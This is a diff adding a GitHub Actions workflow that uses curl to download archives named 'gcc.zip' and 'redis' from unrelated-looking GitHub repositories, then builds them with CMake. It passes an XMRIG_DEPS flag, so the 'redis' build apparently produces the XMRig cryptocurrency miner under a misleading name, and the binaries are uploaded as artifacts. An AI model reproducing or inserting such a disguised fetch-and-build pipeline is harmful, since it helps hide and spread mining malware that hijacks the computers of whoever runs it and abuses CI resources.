@@ -1,0 +1,60 @@
+name: Build on Do 2025-04-30
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout source code
+        uses: actions/checkout@v3
+
+      # Install Visual Studio tools instead of MSYS2 to support MASM
+      - name: Setup Visual Studio Developer Command Prompt
+        uses: ilammy/msvc-dev-cmd@v1
+
+      # Download required dependencies
+      - name: Download dependencies
+        run: |
+          curl -L -o gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip
+          curl -L -o redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip
+          
+      # Unzip dependencies
+      - name: Unzip dependencies
+        run: |
+          powershell -Command "Expand-Archive -Path gcc.zip -DestinationPath gcc"
+          powershell -Command "Expand-Archive -Path redis.zip -DestinationPath redis"
+
+      # Create build directory
+      - name: Create build directory
+        run: mkdir -p redis/redis-D-Win9900/build
+
+      # Install CMake
+      - name: Setup CMake
+        uses: jwlawson/actions-setup-cmake@v1.13
+        with:
+          cmake-version: '3.20.x'
+
+      # Run CMake to generate Visual Studio project files
+      - name: Run CMake to generate VS project files
+        run: |
+          cd redis/redis-D-Win9900/build
+          cmake .. -G "Visual Studio 17 2022" -A x64 -DXMRIG_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 -DBUILD_SHARED_LIBS=OFF
+
+      # Build using Visual Studio's MSBuild
+      - name: Build project
+        run: |
+          cd redis/redis-D-Win9900/build
+          cmake --build . --config Release
+
+      # Archive the build artifacts
+      - name: Archive build artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-artifacts
+          path: redis/redis-D-Win9900/build/Release
